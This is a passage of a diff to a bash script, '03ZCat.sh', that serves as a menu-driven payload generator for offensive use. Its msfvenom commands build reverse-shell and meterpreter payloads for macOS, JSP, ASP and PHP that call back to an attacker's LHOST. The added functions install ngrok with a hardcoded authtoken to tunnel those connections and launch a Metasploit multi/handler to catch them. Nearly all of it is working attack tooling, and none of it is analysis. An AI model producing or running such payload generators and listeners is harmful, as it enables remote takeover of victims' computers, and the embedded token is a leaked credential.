         msfvenom -p osx/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
-        payload='osx/x86/meterpreter/reverse_ipv6_tcp' ;;
+        payload='osx/x86/meterpreter/reverse_ipv6_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
         
         6)
         target
@@ -740,7 +785,8 @@ osx (){
         echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
         echo
         msfvenom -p osx/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
-        payload='osx/x86/meterpreter/reverse_nonx_tcp' ;;
+        payload='osx/x86/meterpreter/reverse_nonx_tcp' 
+        echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     
         * )
@@ -777,7 +823,8 @@ case  $others in
     echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
     echo
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > ~/Desktop/payloads/$file.war 2>/dev/null
-    payload='java/jsp_shell_reverse_tcp' ;;
+    payload='java/jsp_shell_reverse_tcp' 
+    echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     2)
     target
@@ -785,21 +832,85 @@ case  $others in
     echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
     echo
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > ~/Desktop/payloads/$file.asp 2>/dev/null
-    payload='windows/meterpreter/reverse_tcp' ;;
+    payload='windows/meterpreter/reverse_tcp' 
+    echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     3)
     target
     echo
-    echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
+    echo -ne "\033[1;32m[☣️03Zcat] Payload generated"
+    echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
     echo
     msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f php > ~/Desktop/payloads/$file.php 2>/dev/null
-    payload='php/meterpreter_reverse_tcp' ;;
+    payload='php/meterpreter_reverse_tcp' 
+    echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/";;
 
     * )
     echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
     sleep 1
     echo -e "${Cyan}[☣️03Zcat] Exiting..."
     sleep 0.2 
+    exit ;;
+    
+    esac
+}
+
+ngroks () {
+    clear
+    logo 
+sleep 0.3
+echo -e "\033[1;36m.##....##..######...########...#######..##....##"
+echo -e "\033[1;36m.###...##.##....##..##.....##.##.....##.##...##."
+echo -e "\033[1;36m.####..##.##........##.....##.##.....##.##..##.."
+sleep 0.3
+echo -e "\033[1;36m.##.##.##.##...####.########..##.....##.#####..."
+echo -e "\033[1;36m.##..####.##....##..##...##...##.....##.##..##.."
+echo -e "\033[1;36m.##...###.##....##..##....##..##.....##.##...##."
+echo -e "\033[1;36m.##....##..######...##.....##..#######..##....##"
+sleep 0.3
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+echo -e "\t${Green}              ☣️☣️☣☣️☣☣️☣☣️☣️            "
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+sleep 0.3
+echo -ne "${Blue}☣ "
+echo -e "${White}          1⃣ ${Purple}Install       ${Blue}                                ☣"
+echo -e "${White}            2⃣ ${Purple}tcp       ${Blue}                                    ☣"
+echo -e "☣ ${White}          3⃣ ${Purple}http      ${Blue}                                    ☣"
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+sleep 0.3
+echo -ne "${Green}[☣️03Zcat]>>${White} " 
+read ngroks
+
+
+case  $ngroks in
+
+	1)
+	echo -e "${Purple}[☣️03Zcat] Installing ! "
+	sleep 2
+	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip 
+	unzip ngrok-stable-linux-amd64.zip  
+	rm -rf ngrok-stable-linux-amd64.zip 1
+	./ngrok authtoken 1oDM4iyb649ZskN9YM4gLX9aNaP_4mKy4cPKgKcznwg1CZ2u9 > /dev/null 2>&1
+	mv ngrok /bin
+	echo -ne "\033[1;32m[☣️03Zcat] Completed"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n";;
+					
+	2)
+	echo -ne "${Blue}[☣️03Zcat] PORT>> ${White}"; read port
+	echo -ne "\033[1;32m[☣️03Zcat] Tunnel generating"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
+	echo
+	ngrok tcp $port;;	
+	
+	3)
+	echo -ne "${Blue}[☣️03Zcat] PORT>> ${White}"; read port
+	echo -ne "\033[1;32m[☣️03Zcat] Tunnel generating"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
+	echo
+	ngrok http $port;;
+				
+    * )
+    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
+    sleep 1
+    echo -e "${Cyan}[☣️03Zcat] Exiting..."
+    sleep 0.2
     exit ;;
     
     esac
@@ -819,6 +930,7 @@ else
 fi
 
 
+OS () {
 clear
 logo
 sleep 0.3
@@ -830,12 +942,16 @@ echo -ne "${Blue}☣ "
 echo -e "${White}          1⃣ ${Purple}WINDOWS         ${Blue}                              ☣"
 echo -e "☣ ${White}          2⃣ ${Purple}ANDROID       ${Blue}                                ☣"
 echo -e "☣ ${White}          3⃣ ${Purple}LINUX       ${Blue}                                  ☣"
-echo -e "☣ ${White}          4⃣ ${Purple}OSX   ${Blue}                                       ☣"
-echo -e "☣ ${White}          5⃣ ${Purple}OTHERS   ${Blue}                                      ☣"
-echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
+echo -e "☣ ${White}          4⃣ ${Purple}OSX   ${Blue}                                        ☣"
+echo -e "☣ ${White}          5⃣ ${Purple}OTHERS   ${Blue}                                     ☣"
+echo -e "☣ ${White}          6⃣ ${Purple}NGROK   ${Blue}                                      ☣"
+echo -e "☣ ${White}          7⃣ ${Purple}LISTENER   ${Blue}                                   ☣"
+sleep 0.3
+echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️"
 sleep 0.3
 echo -ne "${Green}[☣️03Zcat]>>${White} " 
 read OS
+
 
 case  $OS  in
 
@@ -853,6 +969,12 @@ case  $OS  in
 
     5)
     others ;;
+    
+    6)
+    ngroks ;;
+    
+    7)
+    listener ;;
 
     * )
     echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
@@ -862,19 +984,24 @@ case  $OS  in
     exit ;;
 
 esac
+echo
+./03ZCat.sh
+}
 
-echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/"
+
+listener () {
+clear
+logo
 sleep 0.3
-echo -ne "${Green}[☣️03Zcat] Do you want automatic execution handler and let it listen? [${Cyan}y${Green}/${Cyan}n${Green}]: ${White}" 
-read p
-if [ $p  =  "y" ] 
-then
-    clear
-    echo -e "${Green}[☣️03Zcat] OPENING MSFCONSOLE${Green}... "
-    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit -j "
-elif [ $p  =  "n" ] 
-then
-    echo -e "${Cyan}[☣️03Zcat]           ☠☠ HAPPYE HACKING ☠☠
+echo -e "\033[1;36m ____  ____  ____  ____  ____  ____ "
+echo -e "\033[1;36m||l ||||i ||||s ||||t ||||e ||||n ||"
+echo -e "\033[1;36m||__||||__||||__||||__||||__||||__||"
+sleep 0.3
+echo -e "${Green}[☣️03Zcat] OPENING MSFCONSOLE${Green}... "
+echo -ne "\n${Blue}[☣️03Zcat] LHOST>> ${White}"; read ip
+echo -ne "${Blue}[☣️03Zcat] LPORT>> ${White}"; read port
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit -j "
+echo -e "${Cyan}[☣️03Zcat]           ☠☠ HAPPYE HACKING ☠☠
     
     
     
@@ -884,14 +1011,6 @@ then
                     ▐▓█  ▄  ▄▀  █▓▌░█▄▄▄█░
                     ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
                     ░░░░▄▄███▄▄░░░░░█████░"  
-    sleep 0.2 
-    exit
-else
-    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
-    sleep 1
-    echo -e "${Cyan}[☣️03Zcat] Exiting..."
-    sleep 0.2 
-    exit
-fi
+}
 
-
+OS
